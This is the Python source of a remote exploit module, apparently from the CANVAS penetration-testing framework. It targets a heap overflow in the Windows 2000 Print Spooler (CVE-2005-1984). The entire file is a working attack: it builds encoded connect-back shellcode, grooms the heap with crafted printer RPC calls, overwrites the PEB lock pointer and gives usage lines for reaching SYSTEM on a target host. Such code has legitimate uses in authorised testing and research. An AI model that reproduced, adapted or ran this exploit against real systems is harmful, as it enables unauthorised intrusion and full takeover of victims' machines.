#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2005-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
from shellcode import shellcodeGenerator
from encoder import xorencoder
from libs.newsmb.libdcerpc import s_dce_raw_unistring
import libs.newsmb.libdcerpc as libdcerpc

# GUI info
NAME='Windows Print Spooler Overflow'
DESCRIPTION='Windows Print Spooler win32spl.dll Heap Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='08/09/2005'
DOCUMENTATION["CVE Name"] = "CVE-2005-1984"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-1984"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/Bulletin/MS05-043.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['Note']='Run setthreadtoken(0) in order to revert to SYSTEM privileges'
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS05-043'

CHANGELOG="""
KK 02/19/07:
- Rewritten
"""

NOTES="""
Tested on:
- Windows 2000 Professional SP4 Japanese OOTB

Usage:
./exploits/ms05_043/ms05_043.py -t 10.10.11.134 -v 1 -l 10.10.11.1 -d 5555
./commandlineInterface.py -v 1 -p 5555
"""

targets={
    0: ['Autoversioning',0],
    1: ['Windows 2000', 0x7ffdf020]
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name           = NAME
        self.version        = 0
        self.badstring      = '\0\xff'
        self.myDCE          = None
        self.autoversion    = 1
        self.version        = 0
        self.connectionList = []
        self.subesp         = 0
        self.port           = 445
        self.user           = u''
        self.password       = u''
        self.counter        = 0
        self.UUID           = u'12345678-1234-abcd-ef00-0123456789ab'
        self.uuidversion    = u'1.0'
        self.postactions    =[("reverttoself",[]),("mosdefmigrate",[]),("restart service",["spooler"])]
        self.listenerArgsDict['fromcreatethread'] =0

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        #self.log('Creating shellcode to callback to %s:%s'%(self.callback.ip,self.callback.port))
        #self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,self.callback.ip,self.callback.port,smallcode=1,processname='LSASS.EXE',backupprocess='lsass.exe')
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',None)
        sc.addAttr('Fix RtlEnterCriticalSection',{'SimpleFix':1})
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('SmallRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        rawshellcode=sc.get()
        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        ret=encoder.find_key(rawshellcode)
        if ret==0:
            self.log('Could not find a key for this shellcode!')
            raise Exception,'No shellcode generated'
        self.shellcode=encoder.encode(rawshellcode)
        if self.shellcode=='':
            raise Exception,'No shellcode generated'
        self.log('Xor key used: %x'%(encoder.getkey()))
        self.log('Length of shellcode: %d'%(len(self.shellcode)))
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.user=self.argsDict.get('user',self.user)
        self.password=self.argsDict.get('password',self.password)

    def test(self):
        self.getArgs()

        if self.connect():
            self.port = self.myDCE.dcerpc_connection.port
            self.testOS()
            return 1
        
        self.log('Test failed')
        return 0

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        if app.run()==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        os=app.result
        if os.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        elif os.version=='2000':
            self.version=1
            return 1
        else:
            self.log('OS not vulnerable: %s'%(os))
        return 0

    def buildConnectionList(self):
        self.connectionList=[u'ncacn_np:%s[\\spoolss]'%(self.host)]
        return self.connectionList

    def connect(self):
        connectionList = self.buildConnectionList()
        res = None
        auth_type  = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        
        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
            
        for binding in connectionList:
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if res:
                    break
            except libdcerpc.DCERPCException, ex:
                self.log('DCERPC Error: %s' % ex)

        if not res:
            self.log('Could not connect to remote service')
            return 0

        self.log('Attacking %s' % self.host)
        return 1
    
    def unistring(self,string):
        result=''
        for c in string:
            result+=c+'\0'
        return result

    def RpcAddPrinterEx(self,servername,level,printername,description=None,comment=None):
        """
long  _RpcAddPrinterEx (
 [in][unique][string] wchar_t * arg_1,
 [in] struct struct_3 * arg_2,
 [in] struct struct_1 * arg_3,
 [in] struct struct_4 * arg_4,
 [in] struct struct_F * arg_5,
 [out][context_handle] void ** arg_6
);
        """
        if description!=None and (len(description)%2)!=0:
            description+='A'
        if comment!=None and (len(comment)%2)!=0:
            comment+='A'
        data=''
        data+=struct.pack('<L',1) #[unique] pName
        data+=s_dce_raw_unistring('\\\0\\\0'+servername)
        data+=struct.pack('<LL',level,level) #Level
        if level==1:
            data+=struct.pack('<L',2) #pPrinter
            data+=struct.pack('<L',0) #->Flags
            pointer=0
            if description!=None:
                pointer=3
            data+=struct.pack('<L',pointer) #->pDescription
            data+=struct.pack('<L',4) #->pName
            pointer=0
            if comment!=None:
                pointer=5
            data+=struct.pack('<L',pointer) #->pComment
            if description!=None:
                data+=s_dce_raw_unistring(description) #Description
            data+=s_dce_raw_unistring(printername) #Name
            if comment!=None:
                data+=s_dce_raw_unistring(comment) #Comment
        elif level==2:
            data+=struct.pack('<L',2) #pPrinter
            data+=struct.pack('<L',0) #->pServerName
            data+=struct.pack('<L',3) #->pPrinterName
            data+=struct.pack('<L',0) #->pShareName
            data+=struct.pack('<L',0) #->pPortName
            data+=struct.pack('<L',0) #->pDriverName
            data+=struct.pack('<L',0) #->pComment
            data+=struct.pack('<L',0) #->pLocation
            data+=struct.pack('<L',0) #->pDevMode
            data+=struct.pack('<L',0) #->pSepFile
            data+=struct.pack('<L',0) #->pPrintProcessor
            data+=struct.pack('<L',0) #->pdataType
            data+=struct.pack('<L',0) #->pParameters
            data+=struct.pack('<L',0) #->pSecurityDescriptor
            data+=struct.pack('<L',0) #->Attributes
            data+=struct.pack('<L',0) #->Priority
            data+=struct.pack('<L',0) #->DefaultPriority
            data+=struct.pack('<L',0) #->StartTime
            data+=struct.pack('<L',0) #->UntilTime
            data+=struct.pack('<L',0) #->Status
            data+=struct.pack('<L',0) #->cJobs
            data+=struct.pack('<L',0) #->AveragePPM
            data+=s_dce_raw_unistring(printername) #PrinterName
        data+=struct.pack('<L',0)
        data+=struct.pack('<L',0)
        data+=struct.pack('<L',0)
        data+=struct.pack('<L',0)
        data+=struct.pack('<LL',1,1)
        data+=struct.pack('<L',0)
        self.myDCE.call(0x46, data, response=True)


    def RpcAddPrinterConnection(self,buffer):
        """
long  _RpcAddPrinterConnection (
 [in][string] wchar_t * arg_1
);
        """
        data = ''
        data += s_dce_raw_unistring(buffer)
        self.myDCE.call(0x2b, data, response=True)

    def RpcEnumPorts(self):
        """
long  _RpcEnumPorts (
 [in][unique][string] wchar_t * arg_1,
 [in] long arg_2,
 [in, out][unique][size_is(arg_4)] char * arg_3,
 [in] long arg_4,
 [out] long * arg_5,
 [out] long * arg_6
);
        """
        data=''
        data+=struct.pack('<L',0) #[unique] pName
        data+=struct.pack('<L',1) #Level
        data+=struct.pack('<L',1) #[unique] pPorts
        data+=struct.pack('<L',4)
        data+='\0'*4
        data+=struct.pack('<L',4) #cbBuf
        self.myDCE.call(0x23, data, response=False)


    def MemLeak(self,size,count):
        """MemLeak based on AddPrinterEx calls with level=1"""
        size-=2 #since '\0\0' is added at the end of the string
        for i in range(0,count,2):
            self.RpcAddPrinterEx(self.unistring(self.host),1,self.unistring('Printer%04X'%(self.counter)),'A'*size,'B'*size)
            self.counter+=1
        if (count%2)!=0:
            self.RpcAddPrinterEx(self.unistring(self.host),1,self.unistring('Printer%04X'%(self.counter)),'A'*size)
            self.counter+=1
        return

    def Write4(self,what,where):
        """Writes 'what' at 'where' (and 'where' at 'what'+4)"""
        heapchunk=''
        heapchunk+=struct.pack('<HHBBBB',0x45,0x42,1,0x10,1,1)
        heapchunk+=struct.pack('<LL',what,where)
        data=''
        data+='AAAA'
        data+='\xeb\x06' #jmp forward
        data+='BBBBBB' #partly overwritten
        data+=self.shellcode
        data+='C'*(0x1f6-len(self.shellcode)) #0x1f6 bytes for shellcode
        self.RpcAddPrinterEx(data,2,heapchunk)
        return

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(self.name,self.host,self.port),showlog=True)
        self.log('%s attacking %s:%d - (in progress)'%(self.name,self.host,self.port))
        self.setProgress(10)
        if self.version==0:
            self.testOS()
            if self.version==0:
                self.setInfo('%s attacking %s:%d - (failed)'%(self.name,self.host,self.port),showlog=True)
                self.log('Unable to autodetect the remote operating system')
                return 0
        self.setProgress(20)

        if not self.connect():
            self.setInfo('%s attacking %s:%d - (failed)'%(self.name,self.host,self.port), showlog=True)
            return 0
        
        self.setProgress(30)
        self.log('[*] Filling memory blocks')
        self.MemLeak(0x208,4) #fills in 0x42 sized chunks
        self.MemLeak(0x220,4) #fills in 0x45 sized chunks
        self.RpcAddPrinterConnection('A'*0x54) #creates a hole for 84 byte allocations
        self.RpcAddPrinterConnection('A'*0xA4) #creates a hole for 164 byte allocations
        self.RpcAddPrinterConnection('A'*0x24) #creates a hole for 36 byte allocations
        self.setProgress(40)
        self.log('[*] Populating lookaside table')
        what=0x7ffdf300
        self.log('[*] Write4(0x%08x,0x%08x)'%(what,what+8))
        self.Write4(what,what+8)
        self.setProgress(50)
        what=0x7ffdf310
        self.log('[*] Write4(0x%08x,0x%08x)'%(what,what+8))
        self.Write4(what,what+8)
        self.setProgress(60)
        what=0x7ffdf320
        self.log('[*] Write4(0x%08x,0x%08x)'%(what,what+8))
        self.Write4(what,what+8)
        self.setProgress(70)
        self.log('[*] Overwriting PEB lock function')
        what=0x7ffdf318
        where=0x7ffdf020 #PEB lock function
        self.log('[*] Write4(0x%08x,0x%08x)'%(what,where))
        self.Write4(what,where)
        self.setProgress(80)
        self.log('[*] Triggering PEB lock function')
        self.RpcEnumPorts()
        self.setProgress(90)
        time.sleep(3)
        self.setProgress(100)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d (succeeded!)'%(self.name,self.host,self.port),showlog=True)
            self.log('%s done (succeeded!)'%self.name)
            return 1
        self.setInfo('%s attacking %s:%d (failed)'%(self.name,self.host,self.port),showlog=True)
        self.log('%s done (failed)'%self.name)
        return 1

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None] and hasattr(ret,'interact'):
        ret.interact()
    elif ret not in [0,1,None]:
        print 'Weird return value: %s'%(ret)
